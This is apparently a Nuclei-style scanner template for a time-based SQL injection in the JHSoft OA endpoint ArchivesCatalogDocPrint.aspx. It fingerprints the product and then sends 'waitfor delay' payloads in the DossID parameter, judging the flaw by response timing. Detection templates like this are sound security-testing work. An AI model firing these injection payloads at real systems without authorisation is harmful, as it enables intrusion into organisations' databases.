id: poc-yaml-jinher-archivescatalogdocprint-aspx-sqli
info:
  name: "JHSoft ArchivesCatalogDocPrint.aspx 存在 SQL 注入漏洞"
  author: ProjectDiscoveryAI
  severity: high
  tags: JHSoft OA,金和网络-金和OA
  metadata:
    finger: JHSoft OA
    fofa: app="金和网络-金和OA"

flow: http(1) && http(2)

http:
  - id: check-jhsoft
    method: GET
    path:
      - "{{BaseURL}}/C6/Jhsoft.Web.login/PassWordSlideFull.aspx"
    matchers-condition: or
    matchers:
      - type: word
        words:
          - "JHSoft"
        part: body

  - id: sqli-test
    method: GET
    path:
      - "{{BaseURL}}/c6/Jhsoft.Web.Archives/ArchivesCatalogDocPrint.aspx/?DossID=1'waitfor+delay'0:0:5'--"
      - "{{BaseURL}}/c6/Jhsoft.Web.Archives/ArchivesCatalogDocPrint.aspx/?DossID=1'waitfor+delay'0:0:8'--"
    extractors:
      - type: regex
        part: header
        regex:
          - "SessionId=([a-zA-Z0-9]+)"
        internal: true
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: header
        words:
          - "SessionId="
      - type: word
        part: body
        words:
          - ""
      - type: dsl
        dsl:
          - 'duration_1>=5 && duration_1<=6'
          - 'duration_2 - duration_1 >2'
        condition: and
